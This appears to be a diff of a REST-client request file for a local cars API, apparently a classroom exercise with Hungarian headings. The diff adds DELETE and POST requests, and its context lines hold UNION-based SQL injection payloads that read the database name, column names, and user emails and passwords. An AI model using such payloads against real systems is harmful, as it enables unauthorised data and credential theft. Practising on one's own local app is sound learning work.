@@ -2,9 +2,9 @@
 get http://localhost:3000/cars
 
 ### get car by id
-get http://localhost:3000/cars/11
+get http://localhost:3000/cars/1
 
-### sql inections
+### sql injections
 ### get adabázis
 get http://localhost:3000/cars/1  UNION SELECT database(), '', '', ''
 
@@ -18,3 +18,15 @@ get http://localhost:3000/cars/1 union select column_name, '', '', data_type fro
 ### get user adatok
 get http://localhost:3000/cars/1 union select email, password, '','' from users
 
+### delte car by id
+delete http://localhost:3000/cars/1
+
+### post car
+post http://localhost:3000/cars
+Content-Type: application/json
+
+{
+    "name": "Mercedes",
+    "licenceNumber": "MM-111",
+    "hourlyRate": 2500
+}
